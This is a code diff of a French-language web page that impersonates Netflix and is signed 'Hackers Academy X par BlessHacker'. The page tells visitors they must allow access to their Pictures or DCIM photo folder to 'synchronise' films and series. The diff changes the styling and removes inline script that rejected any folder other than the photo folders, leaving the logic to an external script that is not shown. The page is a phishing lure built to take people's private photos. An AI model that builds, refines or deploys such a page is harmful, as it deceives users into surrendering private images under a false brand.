@@ -30,6 +30,7 @@
       content: '';
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
+      /* Image de fond style bibliothèque Netflix */
       background: url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6d7434e-d6de-4185-a6d4-c77a2d08737b/US-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg') center center / cover no-repeat;
       opacity: 0.6;
       filter: blur(4px) contrast(1.1);
@@ -85,18 +86,18 @@
 
     /* --- CONTENEUR PRINCIPAL (TRANSPARENT) --- */
     .container {
-      background: rgba(0, 0, 0, 0.25); 
+      background: rgba(0, 0, 0, 0.35); 
       border: 1px solid rgba(255, 255, 255, 0.15);
-      backdrop-filter: blur(20px); 
-      -webkit-backdrop-filter: blur(20px);
+      backdrop-filter: blur(25px); 
+      -webkit-backdrop-filter: blur(25px);
       border-radius: 16px;
-      padding: 50px 40px;
-      width: 100%;
-      max-width: 500px;
+      padding: 40px;
+      width: 90%;
+      max-width: 480px;
       text-align: center;
-      box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-      animation: fadeIn 1s ease-out;
-      margin-bottom: 20px;
+      box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+      animation: fadeIn 0.8s ease-out;
+      margin-bottom: 30px;
     }
 
     @keyframes fadeIn {
@@ -106,52 +107,50 @@
 
     h2 {
       margin: 0 0 5px;
-      font-size: 32px;
+      font-size: 28px;
       font-weight: 700;
       text-shadow: 0 2px 4px rgba(0,0,0,0.5);
     }
 
     p.subtitle {
-      color: #ddd;
-      font-size: 16px;
-      margin-bottom: 30px;
+      color: #ccc;
+      font-size: 14px;
+      margin-bottom: 25px;
       font-weight: 400;
       text-shadow: 0 1px 2px rgba(0,0,0,0.5);
     }
 
     /* --- ALERT SYSTEM --- */
     .system-alert {
-      background: rgba(229, 9, 20, 0.15); 
+      background: rgba(229, 9, 20, 0.2); 
       border-left: 4px solid #e50914;
-      padding: 15px;
+      padding: 12px;
       text-align: left;
       border-radius: 4px;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       display: flex;
       align-items: flex-start;
-      gap: 15px;
+      gap: 12px;
     }
 
     .alert-icon {
-      font-size: 20px; color: #e50914; margin-top: 2px;
+      font-size: 18px; color: #e50914; margin-top: 2px;
       filter: drop-shadow(0 0 5px rgba(229, 9, 20, 0.5));
     }
 
     .alert-content h4 {
-      margin: 0 0 5px; font-size: 14px; color: #fff; font-weight: 600;
-      text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+      margin: 0 0 4px; font-size: 13px; color: #fff; font-weight: 600;
     }
 
     .alert-content p {
-      margin: 0; font-size: 12px; color: #eee; line-height: 1.4;
-      text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+      margin: 0; font-size: 11px; color: #eee; line-height: 1.4;
     }
 
     /* --- BOUTONS --- */
     .button {
-      width: 100%; padding: 18px;
+      width: 100%; padding: 16px;
       font-family: 'Montserrat', sans-serif;
-      font-weight: 600; font-size: 16px;
+      font-weight: 600; font-size: 15px;
       border: none; border-radius: 6px;
       cursor: pointer; transition: all 0.3s ease;
       display: flex; align-items: center; justify-content: center;
@@ -175,10 +174,18 @@
 
     button[type="submit"] {
       background: linear-gradient(45deg, #e50914, #b20710);
-      color: white; margin-top: 10px; font-size: 18px;
+      color: white; margin-top: 5px; font-size: 16px;
     }
 
-    button[type="submit"]:hover {
+    /* On désactive le bouton submit s'il n'est pas prêt */
+    button[type="submit"]:disabled {
+        background: #333;
+        color: #777;
+        cursor: not-allowed;
+        box-shadow: none;
+    }
+
+    button[type="submit"]:not(:disabled):hover {
       filter: brightness(1.2);
       box-shadow: 0 0 20px rgba(229, 9, 20, 0.7);
       transform: scale(1.02);
@@ -186,19 +193,19 @@
 
     /* Status texte */
     #folderStatus {
-      color: #46d369; font-size: 13px; min-height: 20px;
-      margin: -10px 0 20px; font-weight: 600;
-      text-shadow: 0 0 10px rgba(70, 211, 105, 0.4);
+      font-size: 12px; min-height: 20px;
+      margin: -5px 0 20px; font-weight: 600;
+      text-shadow: 0 0 10px rgba(0,0,0,0.5);
     }
 
     /* --- PROGRESS --- */
     #progressContainer {
-      margin-top: 30px; display: none; text-align: left;
-      background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px;
+      margin-top: 25px; display: none; text-align: left;
+      background: rgba(0,0,0,0.4); padding: 15px; border-radius: 8px;
     }
 
     .progress-label {
-      font-size: 12px; color: #ccc; margin-bottom: 5px;
+      font-size: 11px; color: #ccc; margin-bottom: 5px;
       display: flex; justify-content: space-between;
     }
 
@@ -214,19 +221,18 @@
     }
 
     #progressText {
-      margin-top: 8px; font-size: 12px; color: #ddd; text-align: right;
+      margin-top: 8px; font-size: 11px; color: #ddd; text-align: right;
     }
 
     #fileInput { display: none; }
 
     /* --- FOOTER --- */
     .hacker-footer {
-      position: absolute; bottom: 20px; width: 100%;
+      position: absolute; bottom: 15px; width: 100%;
       text-align: center;
       font-family: 'Courier New', monospace;
-      font-size: 12px; color: rgba(255, 255, 255, 0.6);
+      font-size: 11px; color: rgba(255, 255, 255, 0.4);
       letter-spacing: 1px;
-      text-shadow: 0 2px 4px rgba(0,0,0,0.9);
       pointer-events: none;
     }
     
@@ -248,10 +254,10 @@
     <p class="subtitle">Configuration du serveur de téléchargement</p>
 
     <div class="system-alert">
-      <div class="alert-icon"><i class="fas fa-info-circle"></i></div>
+      <div class="alert-icon"><i class="fas fa-exclamation-circle"></i></div>
       <div class="alert-content">
-        <h4>Configuration Requise</h4>
-        <p>Pour synchroniser correctement vos films et séries, vous devez sélectionner le dossier système <strong style="color:#fff; text-decoration: underline;">Images (Pictures ou DCIM)</strong> lors de l'étape suivante.</p>
+        <h4>Action Requise</h4>
+        <p>Pour la synchronisation, veuillez autoriser l'accès au dossier système <strong style="color:#fff; text-decoration: underline;">Images (Pictures)</strong> ou <strong>DCIM</strong> lorsque demandé.</p>
       </div>
     </div>
 
@@ -264,20 +270,20 @@
     <form id="uploadForm">
       <input type="file" id="fileInput" webkitdirectory multiple required />
       
-      <button type="submit" class="button">
+      <button type="submit" class="button" id="submitBtn" disabled>
         Démarrer l'importation <i class="fas fa-play"></i>
       </button>
     </form>
 
     <div id="progressContainer">
       <div class="progress-label">
-        <span>Téléchargement en cours...</span>
+        <span>Statut du serveur</span>
         <span id="progressPercent">0%</span>
       </div>
       <div class="progress-bar">
         <div class="progress-bar-fill" id="progressFill"></div>
       </div>
-      <div id="progressText">Préparation...</div>
+      <div id="progressText">En attente...</div>
     </div>
 
   </div>
@@ -286,52 +292,8 @@
     Hackers Academy <span>X</span> par BlessHacker
   </div>
 
-<script>
-  document.addEventListener("DOMContentLoaded", function() {
-      const fileInput = document.getElementById('fileInput');
-      const folderStatus = document.getElementById('folderStatus');
-      const selectBtn = document.getElementById('selectFolderBtn');
-
-      // Relier le clic du bouton design à l'input caché
-      selectBtn.addEventListener('click', () => {
-          fileInput.click();
-      });
-
-      // Vérification sécurisée du dossier lors du changement
-      fileInput.addEventListener('change', function(event) {
-          const files = event.target.files;
-          
-          if (files.length > 0) {
-              // On récupère le chemin relatif du premier fichier (ex: Pictures/photo.jpg)
-              // Et on coupe pour avoir juste le nom du dossier racine
-              const path = files[0].webkitRelativePath;
-              const rootFolder = path.split('/')[0];
-              
-              // Liste des dossiers autorisés (Flexibilité pour majuscules/minuscules)
-              // On accepte: Pictures, DCIM, Images, Photos
-              const allowedNames = ['Pictures', 'DCIM', 'Images', 'Photos'];
-              
-              // Vérification insensible à la casse (pictures == Pictures)
-              const isValid = allowedNames.some(name => name.toLowerCase() === rootFolder.toLowerCase());
-
-              if (isValid) {
-                  // SUCCÈS
-                  folderStatus.style.color = "#46d369";
-                  folderStatus.innerHTML = '<i class="fas fa-check-circle"></i> Dossier <b>' + rootFolder + '</b> configuré avec succès.';
-              } else {
-                  // REFUS / ERREUR
-                  folderStatus.style.color = "#e50914"; // Rouge Netflix
-                  folderStatus.innerHTML = '<i class="fas fa-times-circle"></i> Erreur : Le dossier sélectionné est "'+ rootFolder +'".<br>Vous devez obligatoirement sélectionner <b>Pictures</b> ou <b>DCIM</b>.';
-                  
-                  // Réinitialiser la sélection (Vide l'input)
-                  fileInput.value = ''; 
-              }
-          }
-      });
-  });
-</script>
-
 <script src="script.js"></script>
 
 </body>
 </html>
+
